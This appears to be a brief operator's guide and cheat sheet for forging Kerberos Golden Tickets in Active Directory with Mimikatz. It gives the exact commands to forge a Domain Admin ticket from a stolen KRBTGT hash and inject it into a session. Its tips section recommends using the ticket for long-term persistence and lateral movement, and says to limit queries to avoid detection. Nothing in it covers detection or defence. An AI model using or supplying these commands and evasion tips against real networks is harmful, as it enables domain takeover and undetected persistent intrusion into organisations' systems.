# GoldenTicket

**Type:** Active Directory / Kerberos Attack Tool
**Focus:** Forging Kerberos Ticket Granting Tickets (TGT) for full domain access

---

## 1. Full Feature Overview

* Generates forged Kerberos TGTs (Golden Tickets)
* Grants persistent, full domain access without contacting the DC repeatedly
* Exploits compromised KRBTGT account hash
* Can impersonate any user, including Domain Admins
* Often used for long-term persistence in AD environments
* Compatible with tools like Mimikatz, Rubeus, and PowerView

---

## 2. Requirements & Setup

### Requirements

* Windows environment (or via Wine)
* Administrative privileges or access to KRBTGT hash
* .NET Framework 4.x (if using C# scripts)

### Installation

* Use Mimikatz (`kerberos::golden`)
* Alternatively, PowerShell scripts or Rubeus can generate Golden Tickets

---

## 3. Core Usage

### 3.1 Using Mimikatz

```text
# Launch Mimikatz
privilege::debug
```

### 3.2 Generate Golden Ticket

```text
# Create TGT for Domain Admin
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /krbtgt:<NTLM_HASH> /id:500 /groups:512 /ptt
```

### 3.3 Inject Ticket

```text
# Inject into session immediately
kerberos::ptt ticket.kirbi
```

### 3.4 Verify Ticket

```text
# Check active tickets
klist
```

---

## 4. Tips, Tricks, Best Practices

* Golden Tickets do not expire until KRBTGT hash changes; use for persistent access
* Always use `/ptt` to inject and immediately use the ticket
* Combine with PowerView or BloodHound for AD enumeration
* Avoid detection: limit large-scale queries after injecting the ticket
* Can impersonate high-value accounts for lateral movement

---

## 5. Cheat Sheet

```text
# Launch Mimikatz
privilege::debug

# Generate Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /krbtgt:<NTLM_HASH> /id:500 /groups:512 /ptt

# Inject Ticket
kerberos::ptt ticket.kirbi

# Verify Ticket
klist
```

---
